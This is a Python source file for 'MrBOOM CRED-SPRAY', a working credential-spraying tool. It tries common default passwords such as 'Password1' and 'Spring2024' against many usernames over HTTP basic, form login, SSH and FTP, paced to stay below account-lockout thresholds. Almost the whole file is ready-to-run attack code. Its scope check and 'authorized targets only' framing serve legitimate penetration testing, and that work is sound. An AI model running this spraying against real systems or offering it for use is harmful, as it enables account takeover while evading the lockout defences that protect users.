"""
MRBOOM // CRED-SPRAY — low-and-slow credential spraying for authorized targets.
Sprays a SHORT common-password list across many usernames (the whole point of
spraying: below lockout thresholds). Scope-gated through exploit.set_scope;
refuses out-of-scope targets hard.

Protocols: HTTP basic, HTTP form login, SSH, FTP.
Safety: lockout-aware defaults (passwords per account < threshold), fixed
inter-attempt delay, per-account rotation, no thread storms.

CLI:
  python cred_spray.py --proto http-form --host 127.0.0.1:8080 \
      --path /login --usernames users.txt --lockout-threshold 5
"""
import argparse, ftplib, json, re, socket, ssl, sys, time, urllib.request, urllib.parse, urllib.error

DEFAULT_PASSWORDS = ["Password1", "Welcome1", "Password123", "Changeme1", "Spring2024"]
DEFAULT_USERS = ["admin", "administrator", "root", "test", "user"]

def _have_scope():
    try:
        import exploit
        return exploit.in_scope
    except Exception:
        # Fail closed: if the scope gate is unavailable we MUST NOT allow
        # credential spraying of arbitrary hosts. Refuse everything.
        return lambda host: False

def clean_host(hostport):
    return str(hostport).split(":")[0].split("/")[0]

def check_scope(host):
    in_scope = _have_scope()
    h = clean_host(host)
    if not in_scope(h):
        raise RuntimeError(f"SCOPE VIOLATION: {h} is out of scope — spray refused")

def _http_basic(host, user, password, timeout=8):
    """Returns (success:bool, status:int, detail:str)."""
    url = host if host.startswith("http") else "http://" + host
    import base64
    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    req = urllib.request.Request(url, headers={"Authorization": f"Basic {creds}"})
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return True, r.status, "basic-auth accepted"
    except urllib.error.HTTPError as e:
        return False, e.code, "rejected" if e.code in (401, 403) else f"http {e.code}"
    except Exception as e:
        return False, 0, str(e)[:80]

def _http_form(host, path, user, password, user_field, pass_field, success_marker, timeout=8):
    base = host if host.startswith("http") else "http://" + host
    url = base.rstrip("/") + path
    data = urllib.parse.urlencode({user_field: user, pass_field: password}).encode()
    try:
        req = urllib.request.Request(url, data=data, method="POST")
        r = urllib.request.urlopen(req, timeout=timeout)
        body = r.read(50000).decode("utf-8", "ignore")
        ok = (success_marker and success_marker.lower() in body.lower()) or \
             (success_marker == "" and r.status in (200, 302) and "error" not in body.lower())
        return ok, r.status, body[:120]
    except urllib.error.HTTPError as e:
        return False, e.code, "form rejected"
    except Exception as e:
        return False, 0, str(e)[:80]

def _ssh(host, port, user, password, timeout=8):
    import paramiko
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(clean_host(host), port=port, username=user, password=password,
                  timeout=timeout, allow_agent=False, look_for_keys=False,
                  banner_timeout=timeout, auth_timeout=timeout)
        c.close()
        return True, 0, "ssh auth ok"
    except paramiko.AuthenticationException:
        return False, 0, "auth failed"
    except Exception as e:
        return False, 0, str(e)[:80]

def _ftp(host, port, user, password, timeout=8):
    try:
        f = ftplib.FTP(timeout=timeout)
        f.connect(clean_host(host), port=port)
        f.login(user, password)
        f.quit()
        return True, 0, "ftp login ok"
    except ftplib.error_perm:
        return False, 0, "auth failed"
    except Exception as e:
        return False, 0, str(e)[:80]

def spray(target, proto="http-basic", usernames=None, passwords=None,
          path="/login", user_field="username", pass_field="password",
          success_marker="welcome", port=0, delay=1.5, lockout_threshold=4,
          stop_on_hit=False):
    """Spray credentials. Returns {hits:[{user,password,proto,target}], attempts, locked}.
    Passwords are limited to lockout_threshold-1 per account rotation to stay
    below common account-lockout thresholds."""
    check_scope(target)
    users = usernames or list(DEFAULT_USERS)
    pwds = list(passwords or DEFAULT_PASSWORDS)
    if len(pwds) >= lockout_threshold:
        pwds = pwds[: max(1, lockout_threshold - 1)]
    host = target
    if port and ":" not in target:
        host = f"{target}:{port}"
    elif port and target.startswith(("http://", "https://")):
        host = target

    hits, attempts, locked = [], 0, 0
    attempts_per_user = {u: 0 for u in users}
    for pw in pwds:
        for user in users:
            if attempts_per_user[user] >= lockout_threshold - 1:
                locked += 1
                continue
            attempts += 1
            attempts_per_user[user] += 1
            if proto == "http-basic":
                ok, code, detail = _http_basic(host, user, pw)
            elif proto == "http-form":
                ok, code, detail = _http_form(host, path, user, pw, user_field, pass_field, success_marker)
            elif proto == "ssh":
                ok, code, detail = _ssh(host, port or 22, user, pw)
            elif proto == "ftp":
                ok, code, detail = _ftp(host, port or 21, user, pw)
            else:
                raise ValueError(f"unknown proto: {proto}")
            if ok:
                hits.append({"user": user, "password": pw, "proto": proto,
                             "target": target, "detail": detail})
                if stop_on_hit:
                    return {"hits": hits, "attempts": attempts, "locked_skipped": locked}
            time.sleep(delay)
    return {"hits": hits, "attempts": attempts, "locked_skipped": locked,
            "passwords_per_user": len(pwds)}

def load_lines(path):
    out = []
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            line = line.strip()
            if line and not line.startswith("#"):
                out.append(line)
    return out

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="MrBOOM credential spraying (authorized targets only)")
    ap.add_argument("--proto", default="http-basic",
                    choices=["http-basic", "http-form", "ssh", "ftp"])
    ap.add_argument("--host", required=True, help="target host[:port] or URL")
    ap.add_argument("--path", default="/login")
    ap.add_argument("--usernames", default="", help="file of usernames (one/line)")
    ap.add_argument("--passwords", default="", help="file of passwords (one/line)")
    ap.add_argument("--user-field", default="username")
    ap.add_argument("--pass-field", default="password")
    ap.add_argument("--success-marker", default="welcome")
    ap.add_argument("--delay", type=float, default=1.5)
    ap.add_argument("--lockout-threshold", type=int, default=4)
    ap.add_argument("--stop-on-hit", action="store_true")
    a = ap.parse_args()
    users = load_lines(a.usernames) if a.usernames else None
    pwds = load_lines(a.passwords) if a.passwords else None
    try:
        res = spray(a.host, proto=a.proto, usernames=users, passwords=pwds,
                    path=a.path, user_field=a.user_field, pass_field=a.pass_field,
                    success_marker=a.success_marker, delay=a.delay,
                    lockout_threshold=a.lockout_threshold, stop_on_hit=a.stop_on_hit)
    except RuntimeError as e:
        print(f"REFUSED: {e}", file=sys.stderr)
        raise SystemExit(3)
    print(json.dumps(res, indent=2))
